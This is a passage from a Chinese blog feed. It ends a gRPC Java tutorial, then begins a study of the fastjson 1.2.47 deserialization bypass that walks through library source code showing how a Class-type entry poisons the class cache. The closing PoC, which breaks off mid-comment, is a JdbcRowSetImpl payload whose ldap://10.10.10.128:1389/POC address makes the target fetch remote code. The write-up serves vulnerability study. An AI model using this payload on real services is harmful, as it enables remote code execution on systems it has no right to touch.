             .setStatusReport(result)</span><br><span class="line">                    .build();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">queryIndex</span><span class="params">(StatusRequest request, StreamObserver&lt;StatusResponse&gt; responseObserver)</span> &#123;</span><br><span class="line">            responseObserver.onNext(getResult(request));</span><br><span class="line">            responseObserver.onCompleted();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">TinyStatusServer</span> <span class="variable">statusServer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TinyStatusServer</span>(args[<span class="number">0</span>]);</span><br><span class="line">        statusServer.startServer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="客户端">客户端</h2><p>对应的客户端代码如下，我们使用的阻塞的stub：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> TinyServer.ServerStatusGrpc;</span><br><span class="line"><span class="keyword">import</span> TinyServer.ServerStatusGrpc.ServerStatusBlockingStub;</span><br><span class="line"><span class="keyword">import</span> TinyServer.StatusRequest;</span><br><span class="line"><span class="keyword">import</span> TinyServer.StatusResponse;</span><br><span class="line"><span class="keyword">import</span> io.grpc.Grpc;</span><br><span class="line"><span class="keyword">import</span> io.grpc.InsecureChannelCredentials;</span><br><span class="line"><span class="keyword">import</span> io.grpc.ManagedChannel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * TinyStatus 客户端</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@email</span> float311@163.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/7/4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TinyStatusClient</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> Logger.getLogger(TinyStatusServer.class.getName());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ServerStatusBlockingStub blockingStub;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TinyStatusClient</span><span class="params">(ManagedChannel channel)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.blockingStub = ServerStatusGrpc.newBlockingStub(channel);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">target</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">requestOpt</span> <span class="operator">=</span> args[<span class="number">1</span>];</span><br><span class="line">        <span class="type">ManagedChannel</span> <span class="variable">channel</span> <span class="operator">=</span> Grpc.newChannelBuilder(target, InsecureChannelCredentials.create()).build();</span><br><span class="line">        <span class="type">TinyStatusClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TinyStatusClient</span>(channel);</span><br><span class="line">        <span class="type">StatusRequest</span> <span class="variable">request</span> <span class="operator">=</span> StatusRequest.newBuilder()</span><br><span class="line">                .setRequestOpt(Integer.parseInt(requestOpt))</span><br><span class="line">                .build();</span><br><span class="line">        <span class="type">StatusResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.blockingStub.queryIndex(request);</span><br><span class="line">        logger.info(response.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="/img/gRPC简介与使用/image-20230705113146451.png" /></p><h1 id="参考学习">参考学习</h1><ul><li><a href="https://en.wikipedia.org/wiki/Remote_procedure_call">Remoteprocedure call - Wikipedia</a></li><li><a href="https://en.wikipedia.org/wiki/HTTP">HTTP -Wikipedia</a></li><li><ahref="https://martinfowler.com/articles/richardsonMaturityModel.html">RichardsonMaturity Model (martinfowler.com)</a></li><li><a href="https://grpc.io/docs/what-is-grpc/core-concepts/">Coreconcepts, architecture and lifecycle | gRPC</a></li><li><a href="https://grpc.io/docs/languages/java/basics/">Basicstutorial | Java | gRPC</a></li></ul><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom:33%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;gRPC是谷歌设计的一个开源RPC（Remote Process
Call）框架，其基于谷歌开发的&lt;a
href=&quot;https://protobuf.dev/overview/&quot;&gt;Protocol
Buffer&lt;/a&gt;（也支持其他数据结构如JSON、XML等），并充分吸收了提供了一种分布式系统内部各个微服务之间互相调用的方法，具有语言无关、平台无关、高效（HTTP/2）、安全（TLS）、可扩展性强的特点，已被广泛应用于诸多公司如：NetFlex、Square、Cisco等。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/gRPC简介与使用/image-20230701104730528.png&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="开发技术" scheme="https://lzwgiter.github.io/categories/%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="Java" scheme="https://lzwgiter.github.io/tags/Java/"/>
    
    <category term="分布式技术" scheme="https://lzwgiter.github.io/tags/%E5%88%86%E5%B8%83%E5%BC%8F%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>fastjson反序列化漏洞学习（二）</title>
    <link href="https://lzwgiter.github.io/posts/b74b8800.html"/>
    <id>https://lzwgiter.github.io/posts/b74b8800.html</id>
    <published>2023-04-30T04:01:23.000Z</published>
    <updated>2023-05-03T08:39:29.589Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>紧跟<ahref="https://lzwgiter.github.io/posts/c99165fd.html">上一篇</a>，继续补一下fastjson的审计，复现和分析范围包括1.2.47-1.2.80。</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/33f3fdfdbd7163516bd4eb85bbcb34a7.png" /></p></blockquote><span id="more"></span><h1 id="fastjson-1.2.47">FastJson 1.2.47</h1><p>47出现了最严重的一个漏洞，之前我们可以看到，从25-43所有版本，我们都是在开启AutoType的条件下才可以进行的，配合不同的绕过手段。而47版本的漏洞<strong>无需开启AutoType即可对漏洞进行利用</strong>。据说payload的来源是官方的一个测试commit：<ahref="https://github.com/alibaba/fastjson/commit/be41b36a8d748067ba4debf12bf236388e500c66">removeunused testcase · alibaba/fastjson@be41b36 (github.com)</a>：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502123623460.png" /></p><p>泄露的payload中通过指定Class，并使用<code>val</code>关键字指定了恶意类。在后续分析可以看到，该操作将恶意类注入到了<strong>缓存(mapping)</strong>中，从而导致了在不开启autoType的情况下可以从缓存中获取到这个恶意类。</p><h2 id="温故">温故</h2><p>回顾一下25&lt;= fastjson&lt;=42版本的漏洞，我们都是通过使用特殊字符如<code>L</code>或<code>[</code>绕过的。而在44版本开始，官方已经把<code>L</code>及双写、<code>[</code>开头的利用方式都过过滤掉了：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501185854568.png" /></p><p>看似在开启了<code>autoTypeSupport</code>的情况下没有其他利用方式了，但是仍然是存在问题的。通过上面的代码可以看到，在不使用特殊字符的方式的情况下，恶意类名称肯定是会被第三个黄框里的循环判断发现的，那就没辙了。</p><h2 id="知新">知新</h2><p><strong>那我们如果放弃autoTypeSupport不走这个判断了呢？</strong>这样不就不会进入判断了？47版本的利用方式就是这样的。我们关注一下下面的两条语句：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501190303635.png" /></p><p>若没有开启<code>autoTypeSupport</code>，则会从Mapping或者deserializers中寻找，如果这俩之一找到了，会在下面的if判断中直接返回，后面那个黑白名单机制也不会走了。我们分别看一下这两个分支。</p><p><code>TypeUtils.getClassFromMapping</code>的静态方法会判断这个类名称是否存在于TypeUtils维护的一个concurrentHashMap中，并通过<code>addBaseClassMapping</code>方法配合<code>loadClass</code>方法向这个字典中添加常用类：</p><p><img src="/img/fastjson反序列化漏洞学习（二）/image-20230501190920903.png" style="zoom:67%;" /></p><p>下面是简要代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addBaseClassMappings</span><span class="params">()</span>&#123;</span><br><span class="line">        mappings.put(<span class="string">&quot;byte&quot;</span>, <span class="type">byte</span>.class);</span><br><span class="line">        <span class="comment">// 省略...主要包括八大基本数据类型以及他们带上&quot;[&quot;的样式</span></span><br><span class="line">        mappings.put(<span class="string">&quot;[Z&quot;</span>, <span class="type">boolean</span>[].class);</span><br><span class="line">        Class&lt;?&gt;[] classes = <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;...&#125;;</span><br><span class="line">        <span class="keyword">for</span>(Class clazz : classes)&#123;</span><br><span class="line">            <span class="keyword">if</span>(clazz == <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            mappings.put(clazz.getName(), clazz);</span><br><span class="line">        &#125;</span><br><span class="line">        String[] awt = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;...&#125;;</span><br><span class="line">        <span class="keyword">for</span>(String className : awt)&#123;</span><br><span class="line">            Class&lt;?&gt; clazz = loadClass(className);<span class="comment">// 调用加载</span></span><br><span class="line">            <span class="keyword">if</span>(clazz == <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            mappings.put(clazz.getName(), clazz);</span><br><span class="line">        &#125;</span><br><span class="line">        String[] spring = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;...&#125;;</span><br><span class="line">        <span class="keyword">for</span>(String className : spring)&#123;</span><br><span class="line">            Class&lt;?&gt; clazz = loadClass(className);  <span class="comment">// 调用添加</span></span><br><span class="line">            <span class="keyword">if</span>(clazz == <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            mappings.put(clazz.getName(), clazz);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>看起来都是在添加一些固定的类，我们没有可以插手的地方。那可以利用的就是loadClass函数了，<strong>这里先埋下伏笔</strong>，我们看看另一个if分支。另一个分支的函数的findClass函数如下：</p><p><img src="/img/fastjson反序列化漏洞学习（二）/image-20230501192902439.png" style="zoom:67%;" /></p><p>该函数会从buckets中寻找该类的<strong>父类</strong>，如果可以找到的话则向上转型并返回。这个bucket是一个<code>fastjson.utils.IdentityHashMap</code>类型数据，提供了put方法向其中添加类。能够向这个Map中写入数据的方法包括：</p><p><img src="/img/fastjson反序列化漏洞学习（二）/image-20230501194008345.png" style="zoom:67%;" /></p><p>但是这些函数的参数、添加的内容我们是无法控制的。因此我们就只能想办法利用第一个if分支中的<code>getClassFromMapping</code>了。</p><p>重新回到我提到的<strong>伏笔</strong>--loadClass方法，看看内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="type">boolean</span> cache) &#123;</span><br><span class="line">    <span class="keyword">if</span>(className == <span class="literal">null</span> || className.length() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 先从mappings中判断是否存在</span></span><br><span class="line">    Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line">    <span class="keyword">if</span>(clazz != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断特殊情况，[和L的办法我们已经不能利用了</span></span><br><span class="line">    <span class="keyword">if</span>(className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>))&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 注意这里，若不属于上面两个分支的特殊情况的话，就会直接使用classLoader加载</span></span><br><span class="line">    <span class="comment">// 而这里，是没有做黑名单之类的判断的，而是会直接放到mappings中</span></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(classLoader != <span class="literal">null</span>)&#123;</span><br><span class="line">            clazz = classLoader.loadClass(className);</span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="keyword">if</span>(contextClassLoader != <span class="literal">null</span> &amp;&amp; contextClassLoader != classLoader)&#123;</span><br><span class="line">            clazz = contextClassLoader.loadClass(className);</span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        clazz = Class.forName(className);</span><br><span class="line">        mappings.put(className, clazz);</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以看到，我们是有机可图的，即，若一个类：</p><ul><li>不是<code>L</code>开头<code>;</code>结尾的名字、不是<code>[</code>开头的名字</li><li>不是预先加载的常用类</li></ul><p><strong>那么，就会被加载并放入mapping中。</strong>That's all wegot。</p><p>这个方法在类中有三个重载：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501195252894.png" /></p><p>其中：</p><ul><li><p>LoadClass(x)：均用于加载一些固定名称的类，没法子利用到。</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501195841774.png" /></p></li><li><p>LoadClass(x,y)：除了<code>TypeUtils</code>中的自调用以及加载<code>L</code>和<code>[</code>外，<code>MiscCodec</code>中有一个deserialze方法存在调用，<strong>且那个strVal看起来是可以控制的，稍后我们细看一下。</strong></p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501200028791.png" /></p></li><li><p>LoadClass(x, y, z)：调用都在checkAutoType中，没法利用</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501195732283.png" /></p></li></ul><p>ok，那我们就聚焦于<code>fastjson.serializer.MiscCodec</code>类的<code>deserialize</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">deserialze</span><span class="params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> &#123;</span><br><span class="line">    <span class="type">JSONLexer</span> <span class="variable">lexer</span> <span class="operator">=</span> parser.lexer;</span><br><span class="line">    <span class="comment">// 省略无关代码</span></span><br><span class="line"></span><br><span class="line">    Object objVal;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若parser的resolveStatus符合判断的话，则调用DefaultJSONParser.parse方法获取对象</span></span><br><span class="line">    <span class="keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;</span><br><span class="line">        <span class="comment">// 省略部分代码</span></span><br><span class="line"></span><br><span class="line">        objVal = parser.parse();</span><br><span class="line"></span><br><span class="line">        parser.accept(JSONToken.RBRACE);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        objVal = parser.parse();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String strVal;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (objVal == <span class="literal">null</span>) &#123;</span><br><span class="line">        strVal = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        strVal = (String) objVal;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> JSONObject) &#123;</span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> (JSONObject) objVal;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (clazz == Currency.class) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">currency</span> <span class="operator">=</span> jsonObject.getString(<span class="string">&quot;currency&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (currency != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> (T) Currency.getInstance(currency);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">String</span> <span class="variable">symbol</span> <span class="operator">=</span> jsonObject.getString(<span class="string">&quot;currencyCode&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (symbol != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> (T) Currency.getInstance(symbol);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (clazz == Map.Entry.class) &#123;</span><br><span class="line">               <span class="keyword">return</span> (T) jsonObject.entrySet().iterator().next();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> jsonObject.toJavaObject(clazz);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;expect string&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (strVal == <span class="literal">null</span> || strVal.length() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 省略无关判断代码</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关注点：若这个类是Class类型的，则使用loadClass加载</span></span><br><span class="line">    <span class="keyword">if</span> (clazz == Class.class) &#123;</span><br><span class="line">        <span class="keyword">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 省略无关判断代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么思路就有了，我们需要加载一个Class类型的类，并通过strVal来进行控制。先实验一个简单的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2023/4/26 2023</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 注意，第二个字段必须是val</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;, \&quot;val\&quot;: \&quot;aha\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">pocObj</span> <span class="operator">=</span> JSONObject.parseObject(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为没有开启autoTypeSupport，也不是黑名单类，因此我们就来到了下面的两个分支：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501201612352.png" /></p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501201920530.png" /></p><p>紧接着，我们在findClass方法中，找到了类，这是很自然的，然后在下面的分支中返回class。</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501202140187.png" /></p><p>紧接着，结束了checkAutoType函数，并将当前parser的状态设置为了<code>TypeNameRedirect</code>，<strong>这就满足了前面<code>MiscCodec</code>代码中的判断条件了。</strong></p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501202405636.png" /></p><p>最后反序列化的工作交给了<code>MiscCodec</code>，那么就会进入我们前面的代码片段了：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501203038066.png" /></p><p>可以看到，<code>strVal</code>的值被赋予了我们<code>val</code>字段的值。</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501203136107.png" /></p><p>由于是Class类型的，因此调用loadClass方法：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501203436222.png" /></p><p>并完成加载和<strong>污染</strong>mapping的过程。污染了之后呢？</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501203557717.png" /></p><p>我们就可以从第一个分支中、从mapping中获取这个类了。</p><p>至此就是整个攻击原理和思路了，小结一下，我们的思路是分两个阶段的，是承上启下的关系。</p><ol type="1"><li>关闭autoTypeSupport以逃过黑名单，并通过<code>Class</code>的类型注入<strong>恶意类</strong>到mapping中。</li><li>二次从mapping中读取以加载恶意类。</li></ol><p>因此Poc如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2023/4/26</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            injection: &#123;</span></span><br><span class="line"><span class="comment">                @type: java.lang.Class,</span></span><br><span class="line"><span class="comment">                val: com.sun.rowset.JdbcRowSetImpl</span></span><br><span class="line"><span class="comment">            &#125;,</span></span><br><span class="line"><span class="comment">            utilization: &#123;</span></span><br><span class="line"><span class="comment">                @type: com.sun.rowset.JdbcRowSetImpl,</span></span><br><span class="line"><span class="comment">                dataSourceName: &quot;ldap://10.10.10.128:1389/POC&quot;,</span></span><br><span class="line"><span class="comment">                autoCommit: true</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span 